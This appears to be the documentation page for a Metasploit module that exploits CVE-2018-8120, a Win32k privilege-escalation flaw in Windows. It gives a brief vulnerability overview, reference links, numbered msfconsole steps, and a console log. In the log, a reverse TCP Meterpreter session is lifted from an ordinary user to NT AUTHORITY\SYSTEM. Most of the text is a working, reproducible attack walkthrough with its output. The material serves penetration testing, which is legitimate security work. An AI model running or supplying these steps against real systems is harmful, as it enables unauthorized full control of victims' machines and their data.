## Overview

An elevation of privilege vulnerability exists in Windows when the Win32k component fails to properly handle objects in memory. An attacker who successfully exploited this vulnerability could run arbitrary code in kernel mode. An attacker could then install programs; view, change, or delete data; or create new accounts with full user rights.

To exploit this vulnerability, an attacker would first have to log on to the system. An attacker could then run a specially crafted application that could exploit the vulnerability and take control of an affected system.

The update addresses this vulnerability by correcting how Win32k handles objects in memory.

* https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2018-8120
* http://bigric3.blogspot.com/2018/05/cve-2018-8120-analysis-and-exploit.html
* https://github.com/bigric3/cve-2018-8120
* https://github.com/unamer/CVE-2018-8120

## Verification steps

1. Start `msfconsole`
2. Get a session
3. `use exploit/windows/local/ms18_8120_win32k_privesc`
4. `set SESSION [SESSION]`
5. `set LHOST [LHOST]`
6. `exploit`

## Usage

```
msf exploit(multi/handler) > run

[*] Started reverse TCP handler on 192.168.1.102:4444 
[*] Sending stage (206403 bytes) to 192.168.1.103
[*] Meterpreter session 1 opened (192.168.1.102:4444 -> 192.168.1.103:56748) at 2018-10-10 21:55:52 +0530

meterpreter > getuid 
Server username: zero-PC\zero
meterpreter > background 
[*] Backgrounding session 1...
msf exploit(multi/handler) > use exploit/windows/local/ms18_8120_win32k_privesc 
msf exploit(windows/local/ms18_8120_win32k_privesc) > set SESSION 1
SESSION => 1
msf exploit(windows/local/ms18_8120_win32k_privesc) > set LHOST 192.168.1.102
LHOST => 192.168.1.102
msf exploit(windows/local/ms18_8120_win32k_privesc) > run

[*] Started reverse TCP handler on 192.168.1.102:4444 
[+] Exploiting SetImeInfoEx Win32k NULL Pointer Dereference
[+] Exploit finished, wait for privileged payload execution to complete.
[*] Sending stage (206403 bytes) to 192.168.1.103
[*] Meterpreter session 2 opened (192.168.1.102:4444 -> 192.168.1.103:56749) at 2018-10-10 21:56:35 +0530

meterpreter > getuid 
Server username: NT AUTHORITY\SYSTEM
meterpreter >
```
